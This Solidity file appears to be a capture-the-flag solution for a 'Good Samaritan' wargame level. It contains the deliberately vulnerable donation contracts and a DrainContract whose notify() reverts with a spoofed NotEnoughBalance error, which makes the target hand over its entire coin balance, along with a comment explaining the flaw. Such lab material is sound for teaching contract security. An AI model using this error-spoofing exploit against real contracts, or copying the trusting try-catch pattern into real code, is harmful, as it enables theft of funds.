// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

/*
Congratulations!

Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. 
They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, 
as seen in the GoodSamaritan's requestDonation() function. 
For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). 
Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, 
such as in the notify(uint256 amount) function in your attacker contract.
 */

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}


/// @title Drain all coin from good samaritan
/// @notice Accepts coin's notification and raise an error to indicate transferRemainder() call
contract DrainContract is INotifyable {
    address public owner;
    address public gs;

    event Notify(uint256 amount);
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (owner != msg.sender) {
            revert("only owner could call this function");
        }
        _;
    }

    constructor(address goodSamaritanAddress) {
        owner = msg.sender;
        gs = goodSamaritanAddress;
    }

    receive() external payable {
    }

    function getDonation() public onlyOwner {
        GoodSamaritan(gs).requestDonation();
    }

    function withraw(address coinAddress) public onlyOwner {
        Coin coin = Coin(coinAddress);
        uint256 balance = coin.balances(address(this));
        if (balance > 0) {
            coin.transfer(msg.sender, balance);
        }
    }

    function notify(uint256 amount) external override {
        emit Notify(amount);
        // raise NotEnoughBalance error to force good samaritan transferRemainder() calling 
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}